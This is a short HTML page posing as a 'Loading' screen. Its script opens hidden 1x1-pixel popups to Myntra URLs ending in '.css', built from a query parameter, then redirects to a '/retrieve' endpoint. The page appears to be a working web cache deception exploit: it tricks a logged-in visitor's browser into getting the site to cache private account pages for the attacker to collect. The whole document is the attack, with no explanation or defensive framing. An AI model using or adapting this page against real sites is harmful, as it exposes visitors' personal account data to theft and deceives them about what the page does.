<body>
    <h2 style="text-align: center;">Loading ....</h2>

<script>
    function openMyntra(key,n){
        for(var i=1;i<=n;i++){
            myWindow=window.open(`https://www.myntra.com/x/${key}.css`,'','width=1,height=1')
            myWindow.focus()
        }
    }
    var url=new URLSearchParams(window.location.search)
    var key=url.get('key')
    openMyntra(key,3)
    setTimeout(()=>{
        open('/retrieve'+window.location.search,'_self')
    },1000)
    console.log(key)
</script>
</html>
